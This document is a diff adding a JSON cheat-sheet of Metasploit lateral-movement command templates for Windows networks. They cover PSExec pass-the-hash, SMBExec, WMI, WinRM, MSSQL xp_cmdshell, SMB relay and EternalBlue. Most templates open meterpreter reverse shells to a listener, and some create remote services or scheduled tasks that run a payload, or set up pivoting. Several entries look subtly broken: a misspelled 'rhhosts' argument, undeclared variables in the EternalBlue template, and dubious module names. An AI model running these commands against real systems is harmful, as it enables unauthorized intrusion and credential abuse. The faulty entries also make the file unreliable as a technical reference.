@@ -1,0 +1,733 @@
+{
+  "title": "Metasploit - Lateral Movement",
+  "commands": [
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "SMB username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "SMB password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "PSExec pass-the-password (exploit/windows/smb/psexec)",
+      "description": "Classic PSExec. Executes payload via Windows SMB admin share (ADMIN$). Requires admin credentials.",
+      "template": "use exploit/windows/smb/psexec\nset RHOSTS {rhhosts}\nset SMBUser {smb_user}\nset SMBPass {smb_pass}\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "SMB username",
+          "default": "Administrator"
+        },
+        {
+          "name": "hash",
+          "description": "NTLM hash (LM:NTLM)",
+          "default": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "PSExec pass-the-hash (exploit/windows/smb/psexec)",
+      "description": "Same as above but uses NTLM hash instead of password. No need to crack the hash first.",
+      "template": "use exploit/windows/smb/psexec\nset RHOSTS {rhhosts}\nset SMBUser {smb_user}\nset SMBPass {hash}\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "SMB username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "SMB password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "PSExec with PowerShell payload (psexec_psh)",
+      "description": "Uses PowerShell one-liner instead of binary upload. Smaller footprint, avoids dropping files to disk.",
+      "template": "use exploit/windows/smb/psexec_psh\nset RHOSTS {rhhosts}\nset SMBUser {smb_user}\nset SMBPass {smb_pass}\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "SMB username",
+          "default": "Administrator"
+        },
+        {
+          "name": "hash",
+          "description": "NTLM hash",
+          "default": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+        },
+        {
+          "name": "domain",
+          "description": "Domain",
+          "default": "WORKGROUP"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "SMBExec pass-the-hash (exploit/windows/smb/smbexec)",
+      "description": "Uses SMBExec technique — service control manager over SMB instead of file upload. Good for stealth.",
+      "template": "use exploit/windows/smb/smbexec\nset RHOSTS {rhhosts}\nset SMBUser {smb_user}\nset SMBPass {hash}\nset SMBDomain {domain}\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "SMB username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "SMB password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "WebExec lateral movement (exploit/windows/smb/webexec)",
+      "description": "Uses WebClient service (WebDAV) for execution. Alternative to PSExec when SMB is restricted.",
+      "template": "use exploit/windows/smb/webexec\nset RHOSTS {rhhosts}\nset SMBUser {smb_user}\nset SMBPass {smb_pass}\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "WMI exec via PowerShell (exploit/windows/local/ps_wmi_exec)",
+      "description": "Executes payload via WMI using PowerShell. Does not use SMB at all — bypasses SMB firewall rules.",
+      "template": "use exploit/windows/local/ps_wmi_exec\nset SMBUser {smb_user}\nset SMBPass {smb_pass}\nset RHOSTS {rhhosts}\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "WMI remote exec (exploit/windows/local/wmi)",
+      "description": "Standard WMI remote command execution. Unmanaged WMI, no PowerShell dependency.",
+      "template": "use exploit/windows/local/wmi\nset SMBUser {smb_user}\nset SMBPass {smb_pass}\nset RHOSTS {rhhosts}\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "domain",
+          "description": "Domain",
+          "default": "WORKGROUP"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "WinRM exec (exploit/windows/winrm/winrm_script_exec)",
+      "description": "Executes via WinRM (port 5985/5986). Good when SMB is blocked. Often enabled on domain-joined servers.",
+      "template": "use exploit/windows/winrm/winrm_script_exec\nset RHOSTS {rhhosts}\nset USERNAME {smb_user}\nset PASSWORD {smb_pass}\nset DOMAIN {domain}\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP/range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "username",
+          "description": "SQL username",
+          "default": "sa"
+        },
+        {
+          "name": "password",
+          "description": "SQL password",
+          "default": "sa"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "MSSQL lateral movement (mssql_payload)",
+      "description": "Enables xp_cmdshell on MSSQL server and executes a payload. Useful when SQL server is exposed.",
+      "template": "use exploit/windows/mssql/mssql_payload\nset RHOSTS {rhhosts}\nset USERNAME {username}\nset PASSWORD {password}\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP/range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "username",
+          "description": "SQL username",
+          "default": "sa"
+        },
+        {
+          "name": "password",
+          "description": "SQL password",
+          "default": "sa"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "MSSQL via SQL injection (mssql_payload_sqli)",
+      "description": "Same payload execution but via SQL injection. No direct SQL auth needed — exploit a vulnerable parameter.",
+      "template": "use exploit/windows/mssql/mssql_payload_sqli\nset RHOSTS {rhhosts}\nset USERNAME {username}\nset PASSWORD {password}\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "SMB username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "SMB password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "PDC impersonation over SMB",
+      "description": "Forces target to authenticate to attacker via SMB capture, relay the hash, and get a shell.",
+      "template": "use exploit/windows/smb/smb_relay\nset SRVHOST {lhost_ip}\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        }
+      ],
+      "title": "EternalBlue pass-the-hash (MS17-010)",
+      "description": "Exploits MS17-010 EternalBlue combined with PSExec for post-exploit lateral movement.",
+      "template": "use exploit/windows/smb/ms17_010_psexec\nset RHOSTS {rhhosts}\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "SMB username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "SMB password",
+          "default": "P@ssw0rd"
+        }
+      ],
+      "title": "Net use IPC$ connection (manual)",
+      "description": "Manually authenticates to remote host over SMB. Prerequisite for PSExec and other SMB operations.",
+      "template": "shell net use \\\\{rhhosts}\\ipc$ \"{smb_pass}\" /user:\"{smb_user}\""
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "SMB username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "SMB password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "PSExec from meterpreter (run psexec)",
+      "description": "Uses the in-memory PSExec post module. No need to drop an executable — runs from current session context.",
+      "template": "run post/windows/manage/psexec -r {rhhosts} -u {smb_user} -p {smb_pass} -s {lhost_ip} -d {lport}"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "WMI exec from meterpreter (run wmi)",
+      "description": "Runs commands on remote host via WMI from current session. Avoids dropping binaries.",
+      "template": "run post/windows/manage/wmi -r {rhhosts} -u {smb_user} -p {smb_pass} -c \"powershell -enc <base64_encoded_payload>\""
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Current user token PSExec",
+      "description": "Uses current session's token to authenticate as the user. No password needed — inherits already-authenticated context.",
+      "template": "use exploit/windows/local/current_user_psexec\nset RHOSTS {rhhosts}\nset SESSION 1\nset LHOST {lhost_ip}\nset LPORT {lport}\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Run as a different user (token manipulation)",
+      "description": "Runs a TCP payload as a different user using stolen tokens. Good for privilege escalation + lateral.",
+      "template": "run post/windows/manage/run_as_tcpp -u {smb_user} -p {smb_pass} -s {lhost_ip}:{lport}"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Admin password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "domain",
+          "description": "Domain",
+          "default": "WORKGROUP"
+        }
+      ],
+      "title": "Remote service creation (sc.exe)",
+      "description": "Creates a service on the remote host using sc.exe. Very old-school but reliable.",
+      "template": "shell sc \\\\{rhhosts} create RemoteUpdate binPath= \"cmd /c C:\\Windows\\Temp\\payload.exe\" start= auto && sc \\\\{rhhosts} start RemoteUpdate"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Remote scheduled task lateral movement",
+      "description": "Creates a scheduled task on the remote host that executes your payload immediately.",
+      "template": "shell schtasks /create /s {rhhosts} /u {smb_user} /p \"{smb_pass}\" /tn \"UpdateCheck\" /tr \"C:\\Windows\\Temp\\payload.exe\" /sc once /st 00:00 /f && schtasks /run /s {rhhosts} /tn \"UpdateCheck\""
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        },
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "WMI process call create (manual)",
+      "description": "Uses wmic to spawn a process on the remote host via WMI. No SMB admin share needed.",
+      "template": "shell wmic /node:{rhhosts} /user:{smb_user} /password:\"{smb_pass}\" process call create \"C:\\Windows\\Temp\\payload.exe\""
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        }
+      ],
+      "title": "File copy to remote ADMIN$",
+      "description": "Copys an executable to the remote ADMIN$ share. Usually paired with PSExec or sc.",
+      "template": "shell copy C:\\Windows\\Temp\\payload.exe \\\\{rhhosts}\\admin$\\system32\\"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "smb_user",
+          "description": "Username",
+          "default": "Administrator"
+        },
+        {
+          "name": "smb_pass",
+          "description": "Password",
+          "default": "P@ssw0rd"
+        }
+      ],
+      "title": "List accessible SMB shares",
+      "description": "Enumerates all accessible SMB shares on the target host. Useful for finding writable locations.",
+      "template": "shell net view \\\\{rhhosts} /all"
+    },
+    {
+      "args": [
+        {
+          "name": "rhhosts",
+          "description": "Target IP range",
+          "default": "10.10.10.0/24"
+        }
+      ],
+      "title": "Enum shares post module",
+      "description": "Uses the enum_shares post module to find accessible SMB shares for lateral movement.",
+      "template": "run post/windows/gather/enum_shares RHOSTS={rhhosts}"
+    },
+    {
+      "args": [],
+      "title": "Route all traffic through session (pivoting)",
+      "description": "Adds a route through the current meterpreter session to reach internal networks.",
+      "template": "run autoroute -s 10.10.10.0/24"
+    },
+    {
+      "args": [
+        {
+          "name": "subnet",
+          "description": "Target subnet",
+          "default": "10.10.10.0"
+        },
+        {
+          "name": "netmask",
+          "description": "Subnet mask",
+          "default": "255.255.255.0"
+        },
+        {
+          "name": "session_id",
+          "description": "Session ID to route through",
+          "default": "1"
+        }
+      ],
+      "title": "Manual route add (bypass autoroute)",
+      "description": "Manually adds a route. Useful when autoroute fails or for specific network ranges.",
+      "template": "route add {subnet} {netmask} {session_id}"
+    },
+    {
+      "args": [
+        {
+          "name": "lport",
+          "description": "Local port to forward",
+          "default": "3389"
+        },
+        {
+          "name": "rhhosts",
+          "description": "Remote host behind pivot",
+          "default": "10.10.10.50"
+        },
+        {
+          "name": "rport",
+          "description": "Remote port",
+          "default": "3389"
+        }
+      ],
+      "title": "Port forward through session (RDP via pivot)",
+      "description": "Forwards a remote port back to your local machine. Connect to localhost:3389 to get RDP to internal host.",
+      "template": "portfwd add -L 127.0.0.1 -l {lport} -p {rport} -r {rhhosts}"
+    },
+    {
+      "args": [
+        {
+          "name": "subnet",
+          "description": "Subnet to scan through pivot",
+          "default": "10.10.10.0/24"
+        }
+      ],
+      "title": "SMB scan through pivot (sessions)",
+      "description": "Scans for SMB services through a routed session. Pairs with enumerating hosts before lateral movement.",
+      "template": "use auxiliary/scanner/smb/smb_version\nset RHOSTS {subnet}\nexploit -j"
+    }
+  ]
+}
